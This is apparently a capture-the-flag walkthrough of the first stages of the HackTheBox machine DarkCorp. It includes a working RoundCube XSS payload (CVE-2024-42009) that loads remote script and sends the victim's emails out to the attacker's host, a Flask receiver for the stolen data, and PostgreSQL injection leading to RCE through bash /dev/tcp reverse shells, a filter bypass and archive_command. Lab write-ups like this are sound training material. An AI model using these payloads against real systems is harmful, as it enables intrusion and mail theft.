DarkCorp lives up to its insane difficulty, with three hosts, including a Windows AD domain, and starts with a Debian web/mail server. I’ll exploit an XSS in RoundCube to get access to the admin’s emails, leaking a private subdomain. I’ll reset the admin’s password and get into the dashboard, identifying an SQLI. I’ll abuse PostgreSQL to get RCE from this two ways. In a PGP-encrypted backup I’ll find the hash for another user and crack it, getting auth to the domain. Those creds also get me into a website on the Windows web server that can do status checks on other websites. These checks will attempt NTLM authentication, and I’ll relay that to create a domain entry, and then use printer bug to get the WEB-01 box to authenticate to me, which I can relay to get a silver ticket for administrator on WEB-01. On that host I’ll find the local administrator account creds in the scheduled tasks, and use those to decrypt a stored credential. Password spraying that password will own another account on the domain. That user can get a shadow credential for another user. That user has a matching.adm account, and I’ll do UPN spoofing to get access to that admin account back on the original Linux host. With root access on that host, I’ll pull cached AD credentials from the SSSD database to pivot back to the DC. This user can modify a GPO, which I’ll abuse to get administrator access over the entire domain.

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

The OS identification data is mixed. On the one hand, the [OpenSSH and nginx](about:/cheatsheets/os#debian) versions indicate that the host is likely running Debian 12 Bookworm. On the other hand, both ports show a TTL of 127, which matches the [expected TTL](about:/cheatsheets/os#os-identification) for Windows one hop away. HackTheBox does present this box as a Windows box, which suggests a Linux container or VM running on a Windows host, or maybe even WSL.

### Subdomain Fuzz

While `nmap` doesn’t call it out, visiting `http://10.10.11.54` just redirects to `http://drip.htb` (with a 200 response and redirection in the JavaScript in the page). Given that the webserver is doing host-based routing, I’ll use `ffuf` to check for subdomains of `drip.htb` that respond differently:

```
oxdf@hacky$ ffuf -u http://10.10.11.54 -H "Host: FUZZ.drip.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

It finds one, `mail`. I’ll add both to my `/etc/hosts` file:

```
10.10.11.54 drip.htb mail.drip.htb
```

### drip.htb - TCP 80

#### Site

The site is for a webmail solutions company:

 ![image-20251009112345927](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009112345927.webp)![expand](/icons/expand.png)

There’s a contact form on the page that sends a POST to `/contact`. It feels like it might be real. I’ll keep that in mind should I need an XSS or some other user interaction. There’s also a form to subscribe to the company mailing list. This one just sends a GET request to `/index?email=[input]`, which almost certainly isn’t getting processed. Most of the links go to anchors on the page, but the “Signup” link goes to `/signup`, which offers a form:

![image-20251009112544830](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009112544830.webp)

The “Sign In” link goes to `mail.drip.htb`.

#### Tech Stack

The HTTP response headers don’t show much beyond nginx:

```
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Thu, 09 Oct 2025 15:20:11 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: Cookie
Content-Length: 20360
```

The main page is just `/index`, and doesn’t load as `index.html` or `index.php`. This is likely JavaScript or maybe Ruby or Python. The 404 page doesn’t help:

![image-20251009113227730](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009113227730.webp)

It’s actually the Volt Bootstrap theme from [Themesberg](https://demo.themesberg.com/volt/). The demo page looks just like the website above:

![image-20251009114248524](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009114248524.webp)

This doesn’t really tell me what framework is running on the server.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```
oxdf@hacky$ feroxbuster -u http://drip.htb --dont-extract-links

```

Without `--dont-extract-links` it identifies a ton of uninteresting images, css, and JavaScript. With it, there’s nothing.

### mail.drip.htb

#### Site

This site is an instance of [RoundCube](https://roundcube.net/), a free and open-source webmail software:

![image-20251009143203103](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009143203103.webp)

If I register on the main site, those creds work here to login:

![image-20251009143243017](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009143243017.webp)

The welcome email gives a support email address:

![image-20251009143303490](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009143303490.webp)

Under “Settings” –> “Identities” I’ll see my account is the name I provided at `drip.htb`:

![image-20251009143505819](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009143505819.webp)

#### Tech Stack

This is clearly [RoundCube](https://roundcube.net/). Clicking on the “About” menu item shows the version in a pop-up:

![image-20251009143332614](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009143332614.webp)

I will note that RoundCube uses two cookies, both of which has `HttpOnly` set to true:

![image-20251009205701565](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009205701565.webp)

This means I won’t be able to take them directly using XSS.

#### root

I am able to register a user named root, and on doing so, not only does it receive the welcome email, but also emails every two minutes from Cron:

![image-20251009144614515](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009144614515.webp)

This leaks another username (ebelford), as well as the fact that it’s using [Dovecot](https://dovecot.org/) as a mail server. I don’t believe this was intended, and doesn’t really give anything exploitable.

## Shell as postgres@drip

### Contact Us Form Modifications

#### Request

On submitting the contact us form, there’s an HTTP POST request:

```
POST /contact HTTP/1.1
Host: drip.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: http://drip.htb

Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=0xdf&email=0xdf%40drip.htb&message=hello!%0D%0A&content=text&recipient=support%40drip.htb
```

Strangely, one of the fields is the `recipient`, one of two hidden fields on the form:

![image-20251009162331736](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009162331736.webp)

It’s odd to let the user control that.

#### Modify Recipient

I’ll submit the contact us form again, this time modifying the `recipient` field to be the account I created:

![image-20251009172147216](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251009172147216.webp)

The email arrives, and it identifies a new email, `bcase@drip.htb`:

![image-20251013154233016](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251013154233016.webp)

#### HTML

There’s another option in the POST parameters - `content`. It’s set to “text” by the form. Thinking about what other formats the mail may take, HTML is a reasonable guess. If I try adding HTML to the message without messing with `content`:

```
POST /contact HTTP/1.1
Host: drip.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

name=0xdf&email=0xdf@drip.htb&message=<body>This+is+an+<b>HTML</b>+message</body>&content=text&recipient=0xdf%40drip.htb
```

It doesn’t parse this in the email:

![image-20251013154508117](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251013154508117.webp)

I’ll try changing it to “html”:

```
POST /contact HTTP/1.1
Host: drip.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

name=0xdf&email=0xdf@drip.htb&message=<body>This+is+an+<b>HTML</b>+message</body>&content=html&recipient=0xdf%40drip.htb
```

It processes that HTML in the email:

![image-20251013154625145](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251013154625145.webp)

### CVE-2024-42009

#### Identifying

Searching for vulnerabilities in this version of RoundCube, I’ll come across a few different interesting vulnerabilities. The most interesting is an RCE vulnerability, [CVE-2025-49113](https://nvd.nist.gov/vuln/detail/CVE-2025-49113). However, this vulnerability wasn’t released until June 2025, almost four months after DarkCorp’s release. I’ll poke at this in [Beyond Root](#beyond-root).

I’ll also find [this post](https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/) from Sonar Source goes into three CVEs that were patched in 1.6.8. CVE-2024-42008 and CVE-2024-42009 are both XSS vulnerabilities, and CVE-2024-42010 is an information leak via CSS. Of the two XSS CVEs, CVE-2024-42008 requires a user click, whereas CVE-2024-42009 just requires the email be viewed.

#### Background

The vulnerability for [CVE-2024-42009](https://nvd.nist.gov/vuln/detail/CVE-2024-42009) is described by Nist as:

> A Cross-Site Scripting vulnerability in Roundcube through 1.5.7 and 1.6.x through 1.6.7 allows a remote attacker to steal and send emails of a victim via a crafted e-mail message that abuses a Desanitization issue in message\_body() in program/actions/mail/show.php.

The issue is that the email is initially sanitized using the washtml sanitizer in the `print_body()` function. After that, there is post processing that transforms the full HTML document into a snippet to embed in the page. This transformation is broken in how it removes the `bgcolor` attribute with this regex:

```
/\s?bgcolor=["\']*[a-z0-9#]+["\']*/i
```

It doesn’t check the context of the attribute, so by nesting it like this:

```html
<body title="bgcolor=foo" name="bar onload=alert(origin)">
```

The regex matches on `bgcolor=foo"`, removing it, resulting in:

```html
<body title=" name="bar onload=alert(origin)">
```

This looks a little broken, but it effectively adds the `onload` attribute back into the HTML.

`onload` actually won’t work here, but the article suggests the following POC:

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar">
  Foo
</body>
```

#### Self POC

I’ll take what I have above from playing with the form to test this POC on DarkCorp:

![image-20251013154822382](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251013154822382.webp)

On loading this email, there’s an alert popup!

![image-20251013154843545](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251013154843545.webp)

When I dismiss that there’s just “Foo” as expected based on that HTML:

![image-20251013154905200](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251013154905200.webp)

#### Self Load Script

Now I’ll try to load a script file from my host. I’ll get a payload like this:

```js
var script = document.createElement('script');
script.src = 'http://10.10.14.8/script.js';
document.head.appendChild(script);
```

If I can get this working, it’s nice because then I can run the same payload over and over and just update `script.js` on my system. In fact, if I’m testing on a mailbox I control, I don’t even have to send the email again, but rather just reload the existing email.

Because quote marks are already used in the POC and the POC runs JS without any, I’ll base64-encode the payload and use `eval(atob())` to run it:

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwpzY3JpcHQuc3JjID0gJ2h0dHA6Ly8xMC4xMC4xNC44L3NjcmlwdC5qcyc7CmRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTs=')) foo=bar">
  Foo
</body>
```

Now I’ll URL encode that and send it. On loading the new email, there’s a request at my Python webserver:

```
10.10.14.8 - - [13/Oct/2025 19:54:10] code 404, message File not found
10.10.14.8 - - [13/Oct/2025 19:54:10] "GET /script.js HTTP/1.1" 404 -
```

#### bcase POC

To use this XSS, I’ll need to get this payload into someone else’s browser window. As bcase@drip.htb is the admin, they seem like a good target. I’ll update the `recipient` field and send it. Within a minute, I get another request, this time from DarkCorp:

```
10.10.11.54 - - [13/Oct/2025 20:00:29] code 404, message File not found
10.10.11.54 - - [13/Oct/2025 20:00:29] "GET /script.js HTTP/1.1" 404 -
```

### Read Mail

#### JavaScript

Given that I know the recipient will be in RoundCube, it makes sense to try to read their mail. In the inbox, the URL `http://mail.drip.htb/?_task=mail&_mbox=INBOX` is what shows the full mailbox. I can try to exfil this, but testing on my own account shows that it doesn’t actually return anything useful.

I’ll note the link in each email to open it in a new window:

![image-20251013161418353](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251013161418353.webp)

That opens the URL `http://mail.drip.htb/?_task=mail&_action=show&_uid=13&_mbox=INBOX&_extwin=1`, where 13 is the email ID.

I’ll update my `script.js` to get a range of emails:

```js
for (let i = 1; i <= 15; i++) {
        fetch(\`http://mail.drip.htb/?_task=mail&_action=show&_uid=${i}&_mbox=INBOX&_extwin=1\`, {mode: 'no-cors'})
                .then((resp) => resp.text())
                .then((text) => fetch(\`http://10.10.14.8/?id=${i}&exfil=\` + btoa(text))
        )
}
```

#### Webserver

When I use this on myself, I get a bunch of emails. I could catch these using `python -m http.server` and then manually decode them, but to make life easier, I’ll have Claude write me a simple Flask server to process incoming exfil:

```python
# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "flask",
# ]
# ///
from flask import Flask, request, send_file
import base64
import logging

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/')
def index():
    query_string = request.query_string.decode('utf-8')

    mid = None
    exfil = None

    for param in query_string.split('&'):
        if '=' in param:
            key, value = param.split('=', 1)
            if key == 'id':
                mid = value
            elif key == 'exfil':
                exfil = value

    decoded = base64.b64decode(exfil)
    if not b'SERVER ERROR!' in decoded:
        fn = f'bcase_{mid}.html'
        with open(fn, 'wb') as f:
            f.write(decoded)
        print(f'Wrote email to {fn}')

    return 'Request received'

@app.route('/script.js')
def serve_script():
    try:
        return send_file('script.js', mimetype='application/javascript')
    except FileNotFoundError:
        return 'File not found', 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)
```

I have to parse the parameters in a janky way because if I use `request.get('exfil')`, it URL decodes the `+` in the data as space, and breaks the decode.

#### Emails

When I run this and send an email to bcase, I get:

```
oxdf@hacky$ uv run --script server.py 
 * Serving Flask app 'server'
 * Debug mode: off
Wrote email to bcase_0.html
Wrote email to bcase_1.html
Wrote email to bcase_2.html
Wrote email to bcase_3.html
```

Opening those in Firefox shows the messages. 0 is a draft message without any anything interesting:

1 is the into email:

![image-20251014061508661](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014061508661.webp)

3 is an email I sent to trigger the XSS (I think this gets cleaned up so when I trigger again it’ll be 3 as well unless other players are sending as well between cleanups):

![image-20251014061527086](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014061527086.webp)

2 is interesting:

It comes from ebelford, and reveals a new dashboard.

### SQLi RCE

#### Access to Dev Dashboard

I’ll add `dev-a3f1-01.drip.htb` to my `hosts` file pointing to the same IP. Fortunately for me, I am able to access it directly from my host:

![image-20251014061928361](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014061928361.webp)

Clicking “Login” leads to `/login`, which presents a form:

![image-20251014061949014](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014061949014.webp)

I don’t have any working creds, but there’s a “Reset Password” link:

![image-20251014062049999](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014062049999.webp)

I’ll enter `bcase@drip.htb`:

![image-20251014062136106](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014062136106.webp)

I’ll resend the contact form and there’s an additional email:

![image-20251014062628343](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014062628343.webp)

Visiting the link offers the chance to reset the password:

![image-20251014062715080](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014062715080.webp)

Logging in with bcase / 0xdf (the password I set) works:

 ![image-20251014063004468](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014063004468.webp)![expand](/icons/expand.png)

#### SQLi

There’s an “Analytics” option in the menu bar that leads to `/analytics`:

![image-20251014071952194](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014071952194.webp)

Weirdly, any search pops an SQL error:

![image-20251014072017112](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014072017112.webp)

The error message shows that it’s running PostgreSQL. It seems the query is missing quote marks around the user input, and maybe has some trailing junk. I can fix it by sending `'0xdf';-- -`:

![image-20251014072250287](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014072250287.webp)

That’s SQL injection. A quick check shows that stacked queries are enabled as well, meaning I can query basically whatever I want:

![image-20251014072530261](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014072530261.webp)

#### RCE via COPY TO/FROM PROGRAM

PayloadsAllTheThings has a [section](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program) on getting RCE from Postgres with this POC:

```sql
COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

In the [Out of Band section](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program) there’s this POC:

```sql
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

With some trial and error (it’s very nice to have the full PSQL errors come in response), I can combine these to get something working here that looks like:

```sql
'0xdf'; DO $$ DECLARE cmd text; BEGIN cmd := 'COPY (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'''; EXECUTE cmd; END $$;
```

The DO $syntax creates a PL/pgSQL anonymous code block (the$ are string delimiters for multi-line code) - this gives us a full procedural programming environment within SQL where we can declare variables, execute commands, and capture/exfiltrate output instead of just running blind SQL commands.

This won’t work, and that’s because there’s some kind of mitigation in place removing the string “COPY” from queries. I can see this if I search for “0xdf COPY 0xdf”:

![image-20251014083858601](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014083858601.webp)

I can get around this by encoding the first character of COPY:

```sql
'0xdf';DO $$ DECLARE cmd text; BEGIN cmd := CHR(67) || 'OPY (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'''; EXECUTE cmd; END $$;
```

On sending this, I immediately get a shell:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.54 60444
bash: cannot set terminal process group (126146): Inappropriate ioctl for device
bash: no job control in this shell
postgres@drip:/var/lib/postgresql/15/main$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
postgres@drip:/var/lib/postgresql/15/main$ script /dev/null -c bash
script /dev/null -c bash

#### RCE via archive\_command

There’s a [nice post](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3) from The Gray Area on getting RCE from Postgres if the SQLi has superuser access, which I do:

![image-20251014073903011](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014073903011.webp)

“on” means yes. The article goes into detail, but the shorter version is that I’m going to read the Postgres config, add some lines to it enabling archiving with an `archive_command`, and then write that back in place and reload it.

`archive_mode` is currently set to “on”:

![image-20251014074127240](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014074127240.webp)

`archive_command` returns nothing.

I’ll try to read the config file from the path in the article:

```sql
'0xdf'; select lo_import('/etc/postgresql/10/main/postgresql.conf');-- -
```

The file doesn’t exist:

![image-20251014074751147](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014074751147.webp)

The `10` is the version, and above it showed version 15. That works:

![image-20251014075109003](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014075109003.webp)

Now I can read that file using the returned ID:

```sql
'0xdf'; select encode(lo_get(114575), 'escape');-- -
```

It works:

 ![image-20251014075216235](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014075216235.webp)![expand](/icons/expand.png)

The existing `archive_mode` is set to “on” and the `archive_command` to an empty string. I’ll save this to a local copy, and modify these lines:

```bash
archive_mode = 'always'
archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'
archive_timeout = 1
```

I’ll also remove a ton of comments to make getting it back in place easier.

Now I’ll base64-encode that and write it back to DarkCorp, first setting a temp storage with `lo_from_bytea`:

```sql
'0xdf'; select lo_from_bytea(223, decode('ZGF0YV9kaXJlY3RvcnkgPSAnL3Zhci9saWIvcG9zdGdyZXNxbC8xNS9tYWluJyAgICAgICAgICAjIHVzZSBkYXRhIGluIGFub3RoZXIgZGlyZWN0b3J5CmhiYV9maWxlID0gJy9ldGMvcG9zdGdyZXNxbC8xNS9tYWluL3BnX2hiYS5jb25mJyAgICAgICAgIyBob3N0LWJhc2VkIGF1dGhlbnRpY2F0aW9uIGZpbGUKaWRlbnRfZmlsZSA9ICcvZXRjL3Bvc3RncmVzcWwvMTUvbWFpbi9wZ19pZGVudC5jb25mJyAgICAjIGlkZW50IGNvbmZpZ3VyYXRpb24gZmlsZQpleHRlcm5hbF9waWRfZmlsZSA9ICcvdmFyL3J1bi9wb3N0Z3Jlc3FsLzE1LW1haW4ucGlkJyAgICAgICAgICAgICAgICAgICAjIHdyaXRlIGFuIGV4dHJhIFBJRCBmaWxlCnBvcnQgPSA1NDMyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIChjaGFuZ2UgcmVxdWlyZXMgcmVzdGFydCkKbWF4X2Nvbm5lY3Rpb25zID0gMTAwICAgICAgICAgICAgICAgICAgICMgKGNoYW5nZSByZXF1aXJlcyByZXN0YXJ0KQp1bml4X3NvY2tldF9kaXJlY3RvcmllcyA9ICcvdmFyL3J1bi9wb3N0Z3Jlc3FsJyAjIGNvbW1hLXNlcGFyYXRlZCBsaXN0IG9mIGRpcmVjdG9yaWVzCnNzbCA9IG9mZgpzc2xfY2VydF9maWxlID0gJy9ldGMvc3NsL2NlcnRzL3NzbC1jZXJ0LXNuYWtlb2lsLnBlbScKc3NsX2tleV9maWxlID0gJy9ldGMvc3NsL3ByaXZhdGUvc3NsLWNlcnQtc25ha2VvaWwua2V5JwpzaGFyZWRfYnVmZmVycyA9IDEyOE1CICAgICAgICAgICAgICAgICAgIyBtaW4gMTI4a0IKZHluYW1pY19zaGFyZWRfbWVtb3J5X3R5cGUgPSBwb3NpeCAgICAgICMgdGhlIGRlZmF1bHQgaXMgdXN1YWxseSB0aGUgZmlyc3Qgb3B0aW9uCm1heF93YWxfc2l6ZSA9IDFHQgptaW5fd2FsX3NpemUgPSA4ME1CCmxvZ19saW5lX3ByZWZpeCA9ICclbSBbJXBdICVxJXVAJWQgJyAgICAgICAgICAgICMgc3BlY2lhbCB2YWx1ZXM6CmxvZ190aW1lem9uZSA9ICdVUy9Nb3VudGFpbicKY2x1c3Rlcl9uYW1lID0gJzE1L21haW4nICAgICAgICAgICAgICAgICAgICAgICAgIyBhZGRlZCB0byBwcm9jZXNzIHRpdGxlcyBpZiBub25lbXB0eQpkYXRlc3R5bGUgPSAnaXNvLCBtZHknCnRpbWV6b25lID0gJ1VTL01vdW50YWluJwpsY19tZXNzYWdlcyA9ICdlbl9VUy5VVEYtOCcgICAgICAgICAgICAgICAgICAgICAjIGxvY2FsZSBmb3Igc3lzdGVtIGVycm9yIG1lc3NhZ2UKbGNfbW9uZXRhcnkgPSAnZW5fVVMuVVRGLTgnICAgICAgICAgICAgICAgICAgICAgIyBsb2NhbGUgZm9yIG1vbmV0YXJ5IGZvcm1hdHRpbmcKbGNfbnVtZXJpYyA9ICdlbl9VUy5VVEYtOCcgICAgICAgICAgICAgICAgICAgICAgIyBsb2NhbGUgZm9yIG51bWJlciBmb3JtYXR0aW5nCmxjX3RpbWUgPSAnZW5fVVMuVVRGLTgnICAgICAgICAgICAgICAgICAgICAgICAgICMgbG9jYWxlIGZvciB0aW1lIGZvcm1hdHRpbmcKZGVmYXVsdF90ZXh0X3NlYXJjaF9jb25maWcgPSAncGdfY2F0YWxvZy5lbmdsaXNoJwppbmNsdWRlX2RpciA9ICdjb25mLmQnICAgICAgICAgICAgICAgICAgIyBpbmNsdWRlIGZpbGVzIGVuZGluZyBpbiAnLmNvbmYnIGZyb20KYXJjaGl2ZV9tb2RlID0gJ2Fsd2F5cycKYXJjaGl2ZV9jb21tYW5kID0gJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDMgMD4mMSInCmFyY2hpdmVfdGltZW91dCA9IDEK', 'base64'));-- -
```

The ID is just arbitrary, but I’ll use it to write that to the config location in `/etc`:

```sql
'0xdf'; select lo_export(223, '/etc/postgresql/15/main/postgresql.conf');-- -
```

For these changes to take effect, I need to reload the config with:

![image-20251014081557289](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014081557289.webp)

A short time later, I get a shell at `nc`:

```
oxdf@hacky$ nc -lnvp 443

## Auth as Victor@darkcorp.htb

### Enumeration

#### Container

The current hostname is drip, and the IP address is 172.16.20.3:

```
postgres@drip:/var/lib/postgresql/15/main$ hostname

        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

This suggests I’m running in a container or VM (as suspected during `nmap` scanning). Given that the host is Windows, it seems likely a VM.

#### Home Directories

Three uses have directories in `/home`:

```
postgres@drip:/home$ ls
bcase  ebelford  vmail
```

vmail doesn’t have a shell set in `passwd`, and postgres does:

```
postgres@drip:/home$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
bcase:x:1000:1000:Bryce Case Jr.,,,:/home/bcase:/bin/bash
postgres:x:102:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
```

postgres can’t access bcase, and the others are empty:

```
postgres@drip:/home$ find . -type f              
find: ‘./bcase’: Permission denied
./vmail/.bashrc
./vmail/.bash_logout
./vmail/.profile
```

There is a `.gnupg` directory in the postgres user’s home directory:

```
postgres@drip:/var/lib/postgresql$ ls -la
total 24
drwxr-xr-x  5 postgres postgres 4096 Feb  5  2025 .

```

#### Postgres

I can connect directly to the database by running `psql`:

```
postgres@drip:/$ psql                   
psql (15.10 (Debian 15.10-0+deb12u1))
Type "help" for help.

I’ll connect to `dripmail`:

dripmail=# \connect dripmail
You are now connected to database "dripmail" as user "postgres".
```

There are two tables:

```
dripmail=# \dt 
         List of relations
 Schema |  Name  | Type  |  Owner   
--------+--------+-------+----------
 public | Admins | table | postgres
 public | Users  | table | postgres
(2 rows)
```

I’ll dump both:

```
dripmail=# select * from "Admins";
 id | username |             password             |     email      
----+----------+----------------------------------+----------------

```

These passwords look like MD5s, but only the admin bcase cracks, because I set it!

#### Postgres Logs / SSH

In the logs, there is a different password hash for ebelford:

```
postgres@drip:/var/log/postgresql$ ls
postgresql-15-main.log       postgresql-15-main.log.5.gz
postgresql-15-main.log.1     postgresql-15-main.log.6.gz
postgresql-15-main.log.2.gz  postgresql-15-main.log.7.gz
postgresql-15-main.log.3.gz  postgresql-15-main.log.8.gz
postgresql-15-main.log.4.gz  postgresql-15-main.log.9.gz
postgres@drip:/var/log/postgresql$ zcat *.gz | grep ebelford 
2025-02-03 11:05:04.886 MST [5952] postgres@dripmail STATEMENT:  UPDATE Users SET password = 8bbd7f88841b4223ae63c8848969be86 WHERE username = ebelford;
```

[CrackStation](https://crackstation.net/) will crack that to “ThePlague61780”.

This password actually works for SSH for ebelford:

```
oxdf@hacky$ sshpass -p 'ThePlague61780' ssh ebelford@drip.htb
Warning: Permanently added 'drip.htb' (ED25519) to the list of known hosts.

```

This doesn’t give me much other than an easier way to make tunnels using SSH rather than something like [Chisel](https://github.com/jpillora/chisel), and I’m not sure it was intended as part of the path.

#### Backup

In `/var/backups` there’s a directory named `postgres`:

```
postgres@drip:/var/backups$ ls
alternatives.tar.0     alternatives.tar.4.gz     apt.extended_states.2.gz  dpkg.arch.0     dpkg.arch.4.gz        dpkg.diversions.3.gz  dpkg.statoverride.2.gz  dpkg.status.1.gz  postgres
alternatives.tar.1.gz  alternatives.tar.5.gz     apt.extended_states.3.gz  dpkg.arch.1.gz  dpkg.diversions.0     dpkg.diversions.4.gz  dpkg.statoverride.3.gz  dpkg.status.2.gz
alternatives.tar.2.gz  apt.extended_states.0     apt.extended_states.4.gz  dpkg.arch.2.gz  dpkg.diversions.1.gz  dpkg.statoverride.0   dpkg.statoverride.4.gz  dpkg.status.3.gz
alternatives.tar.3.gz  apt.extended_states.1.gz  apt.extended_states.5.gz  dpkg.arch.3.gz  dpkg.diversions.2.gz  dpkg.statoverride.1.gz  dpkg.status.0          dpkg.status.4.gz
```

It has a single file, which is encrypted with PGP:

```
postgres@drip:/var/backups/postgres$ ls
dev-dripmail.old.sql.gpg
postgres@drip:/var/backups/postgres$ file dev-dripmail.old.sql.gpg 
dev-dripmail.old.sql.gpg: PGP RSA encrypted session key - keyid: 11123366 61D8BC1F RSA (Encrypt or Sign) 3072b .
```

#### Web Servers

There are two website directories (and a Python virtual environment) in `/var/www`:

```
postgres@drip:/var/www$ ls
app_venv  html  roundcube
```

`roundcube` looks like a typical install of RoundCube. `html` has two directories, and the index page that handles redirection:

```
postgres@drip:/var/www/html$ ls
dashboard  dripmail  index.html
postgres@drip:/var/www/html$ cat index.html 
<meta http-equiv="refresh" content="0; url=http://drip.htb/" />
```

In `dashboard`, there’s a Flask web app, and a `.env` file:

```bash
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

This has creds for the DB (though I didn’t need them as the postgres user).

